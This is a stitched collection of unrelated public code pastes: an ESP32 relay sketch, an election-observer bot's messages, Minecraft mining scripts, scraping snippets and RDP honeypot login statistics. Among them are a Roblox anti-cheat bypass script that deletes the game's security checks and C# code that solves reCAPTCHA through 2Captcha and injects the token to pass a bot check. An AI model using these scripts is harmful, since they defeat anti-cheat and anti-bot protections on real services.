// More about Strapping pins that here https://randomnerdtutorials.com/esp32-pinout-reference-gpios/
#define RELAY1 13
#define RELAY2 12
#define RELAY3 14
#define RELAY4 27

//#define USE_PIN // Uncomment this to use PIN during pairing. The pin is specified on the line below
const char *pin = ""1234""; // Change this to more secure PIN.

String device_name = ""ESP32-BT-Slave"";

#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

#if !defined(CONFIG_BT_SPP_ENABLED)
#error Serial Bluetooth not available or not enabled. It is only available for the ESP32 chip.
#endif

BluetoothSerial SerialBT;

//States for the relays, NOTE: we assume ACTIVE LOW for a 4 x relay module
bool relay1state = 1, relay2state = 1, relay3state = 1, relay4state = 1, 
     lastStateRelay1, lastStateRelay2, lastStateRelay3,  lastStateRelay4, 
     watch = 1;

void setup() {
  Serial.begin(115200);
  pinMode(RELAY1, OUTPUT);
  pinMode(RELAY2, OUTPUT);
  pinMode(RELAY3, OUTPUT);
  pinMode(RELAY4, OUTPUT);
  //Always Start in Known State and We have assumed ACTIVE = LOW;
  digitalWrite(RELAY1, relay1state);
  digitalWrite(RELAY2, relay2state);
  digitalWrite(RELAY3, relay3state);
  digitalWrite(RELAY4, relay4state);

  SerialBT.begin(device_name); //Bluetooth device name
  Serial.printf(""The device with name \""%s\"" is started.\nNow you can pair it with Bluetooth!\n"", device_name.c_str());
  //Serial.printf(""The device with name \""%s\"" and MAC address %s is started.\nNow you can pair it with Bluetooth!\n"", device_name.c_str(), SerialBT.getMacString()); // Use this after the MAC method is implemented
  #ifdef USE_PIN
    SerialBT.setPin(pin);
    Serial.println(""Using PIN"");
  #endif
}

void loop() {
  char inComing;
  if (SerialBT.available() > 0) {
    Serial.write(SerialBT.read());
    inComing = Serial.read();
        if(watch){
          if(inComing == '4'){
            relay4state = !relay4state;
          }else if(inComing == '3'){
            relay3state = !relay3state;
          }else if(inComing == '2'){
            relay2state = !relay2state;
          }else if(inComing == '1'){
            relay1state = !relay1state;
          }else{
            Serial.println(F(""Bad command Please try again!""));
          }
          watch = 0;
        }else{
          if(relay1state != lastStateRelay1){
            digitalWrite(RELAY1, relay1state);
          }else if(relay2state != lastStateRelay2){
            digitalWrite(RELAY2, relay2state);
          }else if(relay3state != lastStateRelay3){
            digitalWrite(RELAY3, relay3state);
          }else if(relay4state != lastStateRelay4){
            digitalWrite(RELAY4, relay4state);
          }
          watch = 1;
        }
  }
  lastStateRelay1 = relay1state;
  lastStateRelay2 = relay2state;
  lastStateRelay3 = relay3state;
  lastStateRelay4 = relay4state;
  delay(20);
}


"
AXcx2CXe,Untitled,nclopezo,Python,Friday 15th of March 2024 08:06:16 PM CDT,"""""""
Module that defines an enumeration with the messages that the bot can send
""""""
import os

from enum import Enum


class BotMessages(Enum):
    ENGLISH = {
        'PLEASE_SEND_A_PHOTO':
            'Please send a photo to the bot. Thank you',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            'The photo has been received successfully! Thank you!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            'You have already sent too many photos to the bot. ',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            'You have already sent too many photos to the bot in the last hour.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            'The photo contains inappropiate content. Please send another photo.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            'The photo does not look like a document. Please send another photo.',
        'NOT_IN_WORKING_DATES':
            'The bot is not available at the moment. Please try again during the activation times.',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            'Please provide the site ID and region separated by a comma. Thank you.',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site and region id.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
            'Please provide the number of portable and stationary boxes separated by a comma (7 and 8), for example: '
            '1,2. Thank you.',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            'Invalid numbers please write the numbers separated by comma, for example: 1,2. ',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            'Please provide the number of invalid and valid ballots separated by a comma (9 and 10), '
            'for example: 1,2. Thank you.',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            'Invalid numbers, please write the numbers separated by comma, for example: 1,2.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            'Please provide the number of ballots in favor. Thank you. (13 to 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            'The numbers are not coherent. Please provide the numbers again.',
        'THE_NUMBERS_ARE_CORRECT':
            'The numbers are correct. Thank you! Please now send a photo of the protocol.',
    }
    RUSSIAN = {
        'PLEASE_SEND_A_PHOTO':
            'Приложите фотографию протокола. Спасибо.',
        'PHOTO_SUCCESSFULLY_RECEIVED':
            'Фотография успешно загружена! Спасибо!',
        'PHOTO_ALREADY_PROCESSED':
            'The photo has already been processed.',
        'USER_SENT_TOO_MANY_PHOTOS':
            'От Вас поступило слишком много фотографий.',
        'USER_SENT_TOO_MANY_PHOTOS_IN_THE_LAST_HOUR':
            'От Вас поступило слишком много фотографий за последний час.',
        'PHOTO_CONTAINS_INAPPROPIATE_CONTENT':
            'Эта фотография не похожа на документ. Замените фотографию.',
        'PHOTO_IS_NOT_A_DOCUMENT':
            'Эта фотография не похожа на документ. Замените фотографию.',
        'NOT_IN_WORKING_DATES':
            'Время загрузок ещё не пришло. Ждите до 22.00 17.03.2024 по московскому времени',
        'PROVIDE_POLLING_STATION_NUMBER_AND_REGION_ID':
            'Введите номер избирательного участка и номер субъекта федерации через запятую',
        'INVALID_SITE_ID_AND_REGION_ID':
            'Invalid site ID, please provide a valid site ID.',
        'PROVIDE_PORTABLE_AND_STATIONARY_BOXES':
            'Введите число бюллетеней в переносных и стационарных ящиках через запятую (строки 7 и 8)',
        'INVALID_NUM_PORTABLE_AND_STATIONARY_BOXES':
            'Ошибка при вводе числа бюллетеней из строк 7 и 8. Введите два числа через запятую.',
        'PROVIDE_INVALID_AND_VALID_BALLOTS':
            'Введите число недействительных и действительных бюллетеней через запятую (строки 9 и 10)',
        'INVALID_NUM_OF_INVALID_AND_VALID_BALLOTS':
            'Ошибка при вводе числа бюллетеней из строк 9 и 10. Введите два числа через запятую.',
        'PLEASE_PROVIDE_BALLOTS_IN_FAVOR':
            'Введите число бюллетеней за каждого кандидата через запятую (строки с 13 по 16)',
        'INVALID_NUM_OF_BALLOTS_IN_FAVOR':
            'Invalid number of ballots in favor, please write the numbers separated by comma, for example: 1,2,3,4.',
        'THE_NUMBERS_ARE_NOT_COHERENT':
            'Вы допустили ошибку/ки при вводе числа бюллетеней. Повторите ввод сначала, старайтесь быть внимательней',
        'THE_NUMBERS_ARE_COHERENT':
            'Число бюллетеней введено правильно. Спасибо! Теперь загрузите фото или скан протокола (jpg-файл).',
    }


def get_bot_message(message_key):
    language = os.getenv('BOT_LANGUAGE', 'ENGLISH')  # Default language is English if not specified
    if language.upper() == 'RUSSIAN':
        return BotMessages.RUSSIAN.value.get(message_key, '')
    else:
        return BotMessages.ENGLISH.value.get(message_key, '')
"
z8pwjanc,Untitled,Madi_Perth,Linden Scripting,Friday 15th of March 2024 07:53:14 PM CDT,"dataserver(key queryid, string data)
    {
        if(queryid == currentNoteLength_qry)
        {
            currentNoteLength = (integer) data;
            integer index;

            for(index = 0; index < (currentNoteLength + 1); index++)
            {
                string line = llGetNotecardLineSync(currentNotecard_name, index);
                DS(""sync "" + line);
                if( line == NAK)
                {
                    currentNotecard_line = 0;
                    currentNotecard_query  =  llGetNotecardLine(currentNotecard_name,
                                        currentNotecard_line);

                } else if (line == EOF)
                {
                    integer length = llList2Integer(currentSong_info, 2) * 
                        (llGetListLength(currentSong_info) - 3);
    
                    DS (""Length "" + getInlineTime(length) );
                    DS (""song info : \n"" + llDumpList2String(currentSong_info, ""\n""));
                    // songLength = length;
                    // set_text(RED);
                    DS(""EOF"");
                    play_song();
                } else
                {
                    DS(""sync : else"");
                    if(currentNotecard_line == 0)
                        songLength = (integer) line;
                    currentSong_info += llStringTrim(line, STRING_TRIM);
                }
            }
        }
        
        if(queryid == currentNotecard_query)
         {
             if(data == EOF)
             {
                 integer length = llList2Integer(currentSong_info, 2) * 
                     (llGetListLength(currentSong_info) - 3);
  
                 DS (""Length "" + getInlineTime(length) );
                 DS (""song info : \n"" + llDumpList2String(currentSong_info, ""\n""));
                 // songLength = length;
                 // set_text(RED);
                 DS(""EOF"");
                 play_song();
             }
             else 
             {
                 if(currentNotecard_line == 0)
                     songLength = (integer) data;
                 currentSong_info += llStringTrim(data, STRING_TRIM);
                 currentNotecard_query  =  llGetNotecardLine(currentNotecard_name,
                                    ++currentNotecard_line);
             }
         }
    }"
i5fn4Wfg,Untitled,dereksir,C#,Friday 15th of March 2024 07:47:12 PM CDT,"using System;
using System.Net.Http;

namespace TestApplication {
    class Test {
        static async Task Main(string[] args) {
            string apiUrl = ""https://api.zenrows.com/v1/?apikey=<YOUR_ZENROWS_API_KEY>&url=https%3A%2F%2Fwww.g2.com%2Fproducts%2Fasana%2Freviews&js_render=true&premium_proxy=true"";
            
            using (HttpClient client = new HttpClient()) {
                HttpResponseMessage response = await client.GetAsync(apiUrl);
                
                if (response.IsSuccessStatusCode) {
                    string content = await response.Content.ReadAsStringAsync();
                    Console.WriteLine(content);
                }
                else {
                    Console.WriteLine($""Failed to retrieve data. Status code: {response.StatusCode}"");
                }
            }
        }
    }
}"
UYcApNzL,blade balll anti cheat bypass,Coolman7,Lua,Friday 15th of March 2024 07:34:42 PM CDT,"print(""Bypassing Security Checks.."")

game:GetService(""ReplicatedStorage"").Security.RemoteEvent:Destroy()
game:GetService(""ReplicatedStorage"").Security[""""]:Destroy()
game:GetService(""ReplicatedStorage"").Security:Destroy()
game:GetService(""Players"").LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()"
TGTKPLC4,Untitled,dereksir,C#,Friday 15th of March 2024 07:31:36 PM CDT,"// import the required libraries
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace TwoCaptcha
{
    public class Example
    {
        static void Main(string[] args)
        {
            // set up ChromeDriver
            IWebDriver driver = new ChromeDriver();

            // navigate to the target url
            string target_url = ""https://www.g2.com/products/asana/reviews"";
            driver.Navigate().GoToUrl(target_url);

            // Take a screenshot
            ((ITakesScreenshot)driver).GetScreenshot().SaveAsFile(""screenshot.png"");
 
            // Close the browser
            driver.Quit();
        }
    }
}"
66CEgBMt,2024-03-15_stats.json,rdp_snitch,JSON,Friday 15th of March 2024 07:18:16 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 18,
    ""120.240.145.8"": 6,
    ""45.33.87.154"": 3,
    ""194.165.16.72"": 9,
    ""136.239.159.27"": 9,
    ""205.210.31.245"": 9,
    ""87.251.75.145"": 12,
    ""45.227.254.9"": 3,
    ""87.251.75.64"": 3,
    ""45.227.254.26"": 12,
    ""147.124.212.244"": 3,
    ""185.170.144.3"": 6,
    ""147.124.212.245"": 3,
    ""212.70.149.142"": 9,
    ""36.133.69.73"": 6,
    ""198.235.24.94"": 9,
    ""62.204.41.123"": 18,
    ""165.154.138.107"": 3,
    ""194.165.16.11"": 6,
    ""205.210.31.94"": 9,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""84.201.2.2"": 6,
    ""185.161.248.148"": 3,
    ""198.235.24.240"": 9
  },
  ""asn"": {
    ""AS4134"": 18,
    ""AS56040"": 6,
    ""AS63949"": 3,
    ""AS48721"": 15,
    ""AS17639"": 9,
    ""AS396982"": 36,
    ""AS208091"": 15,
    ""AS267784"": 15,
    ""AS396073"": 6,
    ""AS197414"": 6,
    ""AS204428"": 9,
    ""AS9808"": 6,
    ""AS59425"": 18,
    ""AS135377"": 3,
    ""AS208046"": 18,
    ""AS44066"": 6,
    ""AS49202"": 3
  },
  ""isp"": {
    ""Chinanet"": 18,
    ""China Mobile communications corporation"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Flyservers S.A."": 30,
    ""Converge Information and Communications Technology Solutions"": 9,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 21,
    ""Majestic Hosting Solutions, LLC"": 6,
    ""SS-Net"": 9,
    ""China Mobile"": 6,
    ""Horizon LLC"": 18,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""ColocationX Ltd."": 18,
    ""www.accelerated.de"": 6,
    ""Kisara LLC"": 3
  },
  ""org"": {
    ""Chinanet JS"": 18,
    ""China Mobile"": 6,
    ""Linode"": 3,
    ""Flyservers S.A"": 15,
    ""Converge Information and Communications Technology Solutions, Inc"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 15,
    ""UAB Host Baltic"": 15,
    ""Majestic Hosting Solutions, LLC"": 6,
    ""Xhostis"": 6,
    ""4Media Ltd"": 9,
    ""China Mobile Communications Corporation"": 6,
    ""Horizon LLC"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""diva-e Datacenters GmbH"": 6,
    ""Kisara LLC"": 3
  },
  ""regionName"": {
    ""Jiangsu"": 18,
    ""Guangdong"": 12,
    ""New Jersey"": 3,
    ""Kaunas"": 15,
    ""Metro Manila"": 9,
    ""California"": 36,
    ""North Holland"": 30,
    ""Vilnius"": 15,
    ""Texas"": 6,
    ""Plovdiv"": 9,
    ""Moscow"": 21,
    ""Hesse"": 9,
    ""Virginia"": 9
  },
  ""country"": {
    ""China"": 30,
    ""United States"": 54,
    ""Lithuania"": 30,
    ""Philippines"": 9,
    ""The Netherlands"": 30,
    ""Bulgaria"": 9,
    ""Russia"": 21,
    ""Germany"": 9
  },
  ""account"": {
    ""hello"": 39,
    ""(empty)"": 9,
    ""Administr"": 39,
    ""RIZPgGsVp"": 3,
    ""LvyjlV"": 3,
    ""hXYWAz"": 3,
    ""Test"": 42,
    ""ULyTxttQX"": 3,
    ""SsLhkA"": 3,
    ""dwXFUk"": 3,
    ""Domain"": 24,
    ""Administrator"": 3,
    ""nFnoYByKU"": 3,
    ""EGCxyC"": 3,
    ""CrTOze"": 3,
    ""AYRzvQEiT"": 3,
    ""CCRiWB"": 3,
    ""fimTnf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 192
  },
  ""client_build"": {
    ""Unknown"": 192
  },
  ""client_name"": {
    ""Unknown"": 192
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""mobile"": 21,
    ""hosting"": 54
  }
}"
1BT8c8RL,2024-03-15_stats.json,rdp_snitch,JSON,Friday 15th of March 2024 07:16:10 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 12,
    ""120.240.145.8"": 4,
    ""45.33.87.154"": 2,
    ""194.165.16.72"": 6,
    ""136.239.159.27"": 6,
    ""205.210.31.245"": 6,
    ""87.251.75.145"": 8,
    ""45.227.254.9"": 2,
    ""87.251.75.64"": 2,
    ""45.227.254.26"": 8,
    ""147.124.212.244"": 2,
    ""185.170.144.3"": 4,
    ""147.124.212.245"": 2,
    ""212.70.149.142"": 6,
    ""36.133.69.73"": 4,
    ""198.235.24.94"": 6,
    ""62.204.41.123"": 12,
    ""165.154.138.107"": 2,
    ""194.165.16.11"": 4,
    ""205.210.31.94"": 6,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""84.201.2.2"": 4,
    ""185.161.248.148"": 2,
    ""198.235.24.240"": 6
  },
  ""asn"": {
    ""AS4134"": 12,
    ""AS56040"": 4,
    ""AS63949"": 2,
    ""AS48721"": 10,
    ""AS17639"": 6,
    ""AS396982"": 24,
    ""AS208091"": 10,
    ""AS267784"": 10,
    ""AS396073"": 4,
    ""AS197414"": 4,
    ""AS204428"": 6,
    ""AS9808"": 4,
    ""AS59425"": 12,
    ""AS135377"": 2,
    ""AS208046"": 12,
    ""AS44066"": 4,
    ""AS49202"": 2
  },
  ""isp"": {
    ""Chinanet"": 12,
    ""China Mobile communications corporation"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""Flyservers S.A."": 20,
    ""Converge Information and Communications Technology Solutions"": 6,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 14,
    ""Majestic Hosting Solutions, LLC"": 4,
    ""SS-Net"": 6,
    ""China Mobile"": 4,
    ""Horizon LLC"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""ColocationX Ltd."": 12,
    ""www.accelerated.de"": 4,
    ""Kisara LLC"": 2
  },
  ""org"": {
    ""Chinanet JS"": 12,
    ""China Mobile"": 4,
    ""Linode"": 2,
    ""Flyservers S.A"": 10,
    ""Converge Information and Communications Technology Solutions, Inc"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 10,
    ""UAB Host Baltic"": 10,
    ""Majestic Hosting Solutions, LLC"": 4,
    ""Xhostis"": 4,
    ""4Media Ltd"": 6,
    ""China Mobile Communications Corporation"": 4,
    ""Horizon LLC"": 12,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""diva-e Datacenters GmbH"": 4,
    ""Kisara LLC"": 2
  },
  ""regionName"": {
    ""Jiangsu"": 12,
    ""Guangdong"": 8,
    ""New Jersey"": 2,
    ""Kaunas"": 10,
    ""Metro Manila"": 6,
    ""California"": 24,
    ""North Holland"": 20,
    ""Vilnius"": 10,
    ""Texas"": 4,
    ""Plovdiv"": 6,
    ""Moscow"": 14,
    ""Hesse"": 6,
    ""Virginia"": 6
  },
  ""country"": {
    ""China"": 20,
    ""United States"": 36,
    ""Lithuania"": 20,
    ""Philippines"": 6,
    ""The Netherlands"": 20,
    ""Bulgaria"": 6,
    ""Russia"": 14,
    ""Germany"": 6
  },
  ""account"": {
    ""hello"": 26,
    ""(empty)"": 6,
    ""Administr"": 26,
    ""RIZPgGsVp"": 2,
    ""LvyjlV"": 2,
    ""hXYWAz"": 2,
    ""Test"": 28,
    ""ULyTxttQX"": 2,
    ""SsLhkA"": 2,
    ""dwXFUk"": 2,
    ""Domain"": 16,
    ""Administrator"": 2,
    ""nFnoYByKU"": 2,
    ""EGCxyC"": 2,
    ""CrTOze"": 2,
    ""AYRzvQEiT"": 2,
    ""CCRiWB"": 2,
    ""fimTnf"": 2
  },
  ""keyboard"": {
    ""Unknown"": 128
  },
  ""client_build"": {
    ""Unknown"": 128
  },
  ""client_name"": {
    ""Unknown"": 128
  },
  ""ip_type"": {
    ""Unknown"": 78,
    ""mobile"": 14,
    ""hosting"": 36
  }
}"
mQSZFN7a,2024-03-15_stats.json,rdp_snitch,JSON,Friday 15th of March 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 6,
    ""120.240.145.8"": 2,
    ""45.33.87.154"": 1,
    ""194.165.16.72"": 3,
    ""136.239.159.27"": 3,
    ""205.210.31.245"": 3,
    ""87.251.75.145"": 4,
    ""45.227.254.9"": 1,
    ""87.251.75.64"": 1,
    ""45.227.254.26"": 4,
    ""147.124.212.244"": 1,
    ""185.170.144.3"": 2,
    ""147.124.212.245"": 1,
    ""212.70.149.142"": 3,
    ""36.133.69.73"": 2,
    ""198.235.24.94"": 3,
    ""62.204.41.123"": 6,
    ""165.154.138.107"": 1,
    ""194.165.16.11"": 2,
    ""205.210.31.94"": 3,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""84.201.2.2"": 2,
    ""185.161.248.148"": 1,
    ""198.235.24.240"": 3
  },
  ""asn"": {
    ""AS4134"": 6,
    ""AS56040"": 2,
    ""AS63949"": 1,
    ""AS48721"": 5,
    ""AS17639"": 3,
    ""AS396982"": 12,
    ""AS208091"": 5,
    ""AS267784"": 5,
    ""AS396073"": 2,
    ""AS197414"": 2,
    ""AS204428"": 3,
    ""AS9808"": 2,
    ""AS59425"": 6,
    ""AS135377"": 1,
    ""AS208046"": 6,
    ""AS44066"": 2,
    ""AS49202"": 1
  },
  ""isp"": {
    ""Chinanet"": 6,
    ""China Mobile communications corporation"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""Flyservers S.A."": 10,
    ""Converge Information and Communications Technology Solutions"": 3,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 7,
    ""Majestic Hosting Solutions, LLC"": 2,
    ""SS-Net"": 3,
    ""China Mobile"": 2,
    ""Horizon LLC"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""ColocationX Ltd."": 6,
    ""www.accelerated.de"": 2,
    ""Kisara LLC"": 1
  },
  ""org"": {
    ""Chinanet JS"": 6,
    ""China Mobile"": 2,
    ""Linode"": 1,
    ""Flyservers S.A"": 5,
    ""Converge Information and Communications Technology Solutions, Inc"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 5,
    ""UAB Host Baltic"": 5,
    ""Majestic Hosting Solutions, LLC"": 2,
    ""Xhostis"": 2,
    ""4Media Ltd"": 3,
    ""China Mobile Communications Corporation"": 2,
    ""Horizon LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""diva-e Datacenters GmbH"": 2,
    ""Kisara LLC"": 1
  },
  ""regionName"": {
    ""Jiangsu"": 6,
    ""Guangdong"": 4,
    ""New Jersey"": 1,
    ""Kaunas"": 5,
    ""Metro Manila"": 3,
    ""California"": 12,
    ""North Holland"": 10,
    ""Vilnius"": 5,
    ""Texas"": 2,
    ""Plovdiv"": 3,
    ""Moscow"": 7,
    ""Hesse"": 3,
    ""Virginia"": 3
  },
  ""country"": {
    ""China"": 10,
    ""United States"": 18,
    ""Lithuania"": 10,
    ""Philippines"": 3,
    ""The Netherlands"": 10,
    ""Bulgaria"": 3,
    ""Russia"": 7,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 13,
    ""(empty)"": 3,
    ""Administr"": 13,
    ""RIZPgGsVp"": 1,
    ""LvyjlV"": 1,
    ""hXYWAz"": 1,
    ""Test"": 14,
    ""ULyTxttQX"": 1,
    ""SsLhkA"": 1,
    ""dwXFUk"": 1,
    ""Domain"": 8,
    ""Administrator"": 1,
    ""nFnoYByKU"": 1,
    ""EGCxyC"": 1,
    ""CrTOze"": 1,
    ""AYRzvQEiT"": 1,
    ""CCRiWB"": 1,
    ""fimTnf"": 1
  },
  ""keyboard"": {
    ""Unknown"": 64
  },
  ""client_build"": {
    ""Unknown"": 64
  },
  ""client_name"": {
    ""Unknown"": 64
  },
  ""ip_type"": {
    ""Unknown"": 39,
    ""mobile"": 7,
    ""hosting"": 18
  }
}"
HunFbKsE,programMenuInstaller,jig487,Lua,Friday 15th of March 2024 06:59:24 PM CDT,"--pastebin get HunFbKsE installer

local files = {
    quarryMiner = ""XiXBZTJB"",
    stripMiner = ""umgqnKXR"",
    startup = ""CftYYagg""
}
 
term.clear()
term.setCursorPos(1,1)

for k, v in pairs(files) do
    if fs.exists(k.."".lua"") then fs.delete(k.."".lua"") end
    print(k.."": ""..v)
    shell.run(""pastebin get "", v, k.."".lua"")
end

print(""Code download complete! Opening menu..."")
sleep(3)

local startupFunc = require(""startup"")
startup()"
s3vHRkDr,Untitled,dereksir,C#,Friday 15th of March 2024 06:56:39 PM CDT,"// import the required libraries
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using TwoCaptcha.Captcha;

namespace TwoCaptcha
{
    public class Example
    {
        static void Main(string[] args)
        {
            // set up ChromeDriver
            IWebDriver driver = new ChromeDriver();

            // navigate to the target url
            string target_url = ""https://www.google.com/recaptcha/api2/demo"";
            driver.Navigate().GoToUrl(target_url);

            // create a new TwoCaptcha instance
			TwoCaptcha solver = new TwoCaptcha(""YOUR_API_KEY"");
			
			// create a new instance of the ReCaptcha class
            ReCaptcha captcha = new ReCaptcha();
            // set the site key for the ReCaptcha
            captcha.SetSiteKey(""6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-"");
            // set the URL of the target webpage where the ReCaptcha is located
            captcha.SetUrl(target_url);

			// declare solution variable
            string solution = null;
 
            try
            {
                // call the Solve method to solve the ReCaptcha
                solver.Solve(captcha).Wait();
                solution = captcha.Code;
                // print the captcha solution
                Console.WriteLine(""Captcha solved: "" + solution);
            }
            catch (AggregateException e)
            {
                // if an error occurs during captcha solving, catch the AggregateException and print the error message
                Console.WriteLine(""Error occurred: "" + e.InnerExceptions.First().Message); 
			}
 
            // select g-recaptcha-response element
            IWebElement recaptchaResponseElement = driver.FindElement(By.Id(""g-recaptcha-response""));
            // set the value of selected element to the CAPTCHA solution
            ((IJavaScriptExecutor)driver).ExecuteScript($""arguments[0].value = '{solution}';"", recaptchaResponseElement);
 
            // Click the submit button
            IWebElement submitButton = driver.FindElement(By.CssSelector(""#recaptcha-demo-submit""));
            submitButton.Click();
            
            // Take a screenshot
            ((ITakesScreenshot)driver).GetScreenshot().SaveAsFile(""screenshot.png"");
 
            // Close the browser
            driver.Quit();
        }
    }
}"
umgqnKXR,stripMiner,jig487,Lua,Friday 15th of March 2024 06:56:19 PM CDT,"--goes through the turtles inventory and drops anything not included in the list.
local function purgeInventory( list )
    local goodItem = false
    for i = 1, 16 do
        goodItem = false
        local itemTbl = turtle.getItemDetail(i)
        for j = 1, #list do
            if itemTbl then
                if itemTbl.name then
                    if itemTbl.name == list[j] then
                        goodItem = true
                        break
                    end
                end
            end
        end
        if goodItem == false then
            turtle.select(i)
            turtle.drop()
        end
    end
    turtle.select(1)
end

--attempts to move forward. If fails, mines the block/s in front of and above the turtle until it can
local function mineForward(blocks)
    blocks = blocks or 1
    for i = 1, blocks do
        while not turtle.forward() do
            turtle.dig()
        end
        turtle.digUp()
    end
end

local function drawDisplay(rowNumber,length,depth)
    term.clear()
    term.setCursorPos(1,1)
    term.setTextColor(colors.yellow)
    term.write(""Running: "")
    term.setTextColor(colors.lime)
    term.write(""simpleStripMiner"")
    term.setTextColor(colors.yellow)
    term.write("" !"")

    term.setCursorPos(1,3)
    term.setTextColor(colors.orange)
    term.write(""Current row: "")
    term.setTextColor(colors.cyan)
    term.write(rowNumber)
    term.setTextColor(colors.orange)
    term.write(""/"")
    term.setTextColor(colors.blue)
    term.write(length)

    local estimatedMined = (rowNumber)*depth*2 + (rowNumber)*6
    local maxBlocks = length*depth*2 + length*6

    term.setCursorPos(1,4)
    term.setTextColor(colors.orange)
    term.write(""Estimated mined blocks:"")
    term.setTextColor(colors.pink)
    term.write(estimatedMined)
    term.setTextColor(colors.orange)
    term.write(""/"")
    term.setTextColor(colors.magenta)
    term.write(maxBlocks)
    term.setTextColor(colors.orange)
    term.write(""!"")

    term.setCursorPos(1,5)
    term.setTextColor(colors.red)
    term.write(""Fuel "")
    term.setTextColor(colors.orange)
    term.write(""remaining: "")
    term.setTextColor(colors.gray)
    print(turtle.getFuelLevel())
    term.setTextColor(colors.brown)
    term.write(""Blocks "")
    term.setTextColor(colors.orange)
    term.write(""remaining: "")
    term.setTextColor(colors.gray)
    term.write(maxBlocks-estimatedMined)

    term.setCursorPos(1,8)
    term.setTextColor(colors.orange)
    term.write(""* Hold 'ctr + t' to stop!"")
    term.setTextColor(colors.red)
    term.setCursorPos(9,8)
    term.write(""ctr + t"")
    term.setTextColor(colors.orange)
    term.setCursorPos(13,8)
    term.write(""+"")

    term.setCursorPos(1,9)
    print(""* Use the 'refuel' command after stopping the program to refuel the turtle!"")
    term.setTextColor(colors.red)
    term.setCursorPos(12,9)
    term.write(""refuel"")
    term.setTextColor(colors.yellow)
    term.setCursorPos(28,9)
    term.write(""after"")

    term.setTextColor(colors.white)
end

local function run(length,depth,dir)
    local whitelist = {
        ""minecraft:diamond"",
        ""minecraft:emerald"",
        ""minecraft:raw_gold"",
        ""minecraft:raw_iron"",
        ""minecraft:raw_copper"",
        ""minecraft:coal"",
        ""minecraft:lapis_lazuli"",
        ""minecraft:quartz"",
        ""minecraft:ancient_debris""
    }

    local turn1 = turtle.turnLeft
    local turn2 = turtle.turnRight

    if dir == 0 then
        dir = ""right""
    else
        dir = ""left""
    end

    if dir == ""right"" then
        turn1 = turtle.turnRight
        turn2 = turtle.turnLeft
    end

    local blocksSinceLastPurge = 0

    drawDisplay(0,length,depth)

    for x = 1, length do
        mineForward(depth)

        if x%2 ~= 0 then
            turn1()
            mineForward(3)
            turn1()
        else
            turn2()
            mineForward(3)
            turn2()
        end

        drawDisplay(x,length,depth)
        blocksSinceLastPurge = blocksSinceLastPurge + depth*2

        if blocksSinceLastPurge > 500 then
            purgeInventory(whitelist)
            blocksSinceLastPurge = 0
        end
    end
end

return {
    run = run
}"
ffE4FRRv,Untitled,sissou123,HTML,Friday 15th of March 2024 06:53:38 PM CDT,"The Complete Guide to HTML
Go From Beginner To HTML Master In A Single Day! 
What you'll learn
Create well-structured web pages with HTML
Create complex HTML forms
Understand web accessibility and create accessible webpages 
for more:https://cuty.io/sRBX
"
GYwJVWYs,Untitled,dereksir,C#,Friday 15th of March 2024 06:48:31 PM CDT,"namespace TwoCaptcha
{
    public class Example
    {
        static void Main(string[] args)
        {
            // select g-recaptcha-response element
			IWebElement recaptchaResponseElement = driver.FindElement(By.Id(""g-recaptcha-response""));

            // set the value of selected element to the CAPTCHA solution
            ((IJavaScriptExecutor)driver).ExecuteScript($""arguments[0].value = '{solution}';"", recaptchaResponseElement);

            // Click the submit button
            IWebElement submitButton = driver.FindElement(By.CssSelector(""#recaptcha-demo-submit""));
            submitButton.Click();
			
